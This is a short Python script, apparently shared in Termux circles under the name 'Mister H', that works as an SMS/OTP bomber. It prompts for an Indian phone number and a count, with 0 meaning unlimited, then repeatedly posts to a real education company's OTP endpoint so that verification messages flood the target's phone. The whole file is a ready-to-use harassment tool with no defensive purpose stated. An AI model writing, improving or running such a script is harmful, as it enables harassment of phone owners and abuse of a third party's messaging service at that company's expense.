import requests
print('Mister H')
print('Follow on IG: @__mister_h__\nTelegram: @M15T3R_H\nTelegram Group: https://t.me/TermuxNewUser\nImportant: Only supports Indian Numbers\n')
n=input("Enter 10-digit Number:")
p=input("Number of OTPs(0 for unlimited):")
try:
 if int(p)>0: 
  for i in range(int(p)):
   requests.post('https://www.aakash.ac.in/cbt/get-centre-by-city.php', data={'action':'otp','key':n})
   print('Number of requests sent:'+str(i+1))
 elif int(p)==0:
  print('Ctrl+C to Exit')
  i=0
  while True:
   i+=1
   requests.post('https://www.aakash.ac.in/cbt/get-centre-by-city.php', data={'action':'otp','key':n})
   print('Number of requests sent:'+str(i))
 else:
  print('invalid input')
except:
 print('error occured')
